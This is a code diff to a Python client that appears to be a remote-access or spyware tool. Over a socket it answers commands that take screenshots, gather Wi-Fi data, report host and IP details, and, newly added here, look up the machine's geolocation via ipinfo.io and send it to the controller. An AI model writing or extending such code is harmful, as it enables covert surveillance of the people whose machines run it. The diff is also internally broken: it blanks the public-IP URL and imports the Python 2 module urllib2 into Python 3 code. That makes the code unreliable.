@@ -5,6 +5,8 @@ import time
 from mss import mss
 from requests import get
 import os
+import json
+from urllib2 import urlopen
 #asd
 def screen(client_socket):
     message = ".img"
@@ -51,7 +53,7 @@ def wifi(client_socket):
 def system(client_socket):
     hostname = socket.gethostname()
     local_ip = socket.gethostbyname(hostname)
-    public_ip = get('http://api.ipify.org').text
+    public_ip = get('').text
     message = (f'.Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}')
     client_socket.send(message.encode('utf-8'))
 
@@ -62,6 +64,7 @@ def obr(message,client_socket):
         case "/wifi": wifi(client_socket)
         case "/system": system(client_socket)
         case "/screen": screen(client_socket)
+        case "/locale": location(client_socket)
         case _:
             message = ".Неизвесная команда"
             client_socket.send(message.encode('utf-8'))
@@ -101,6 +104,19 @@ def start_client():
 #    client.send(message.encode('utf-8'))
 
 #  client.close()
+import re
 
+def location(client_socket):
+    url = 'http://ipinfo.io/json'
+    response = urlopen(url)
+    data = json.load(response)
+
+    IP=data['ip']
+    org=data['org']
+    city = data['city']
+    country=data['country']
+    region=data['region']
+    message = 'IP : {4} \nRegion : {1} \nCountry : {2} \nCity : {3} \nOrg : {0}'.format(org,region,country,city,IP)
+    client_socket.send(message.encode('utf-8'))
 if __name__ == "__main__":
   start_client()
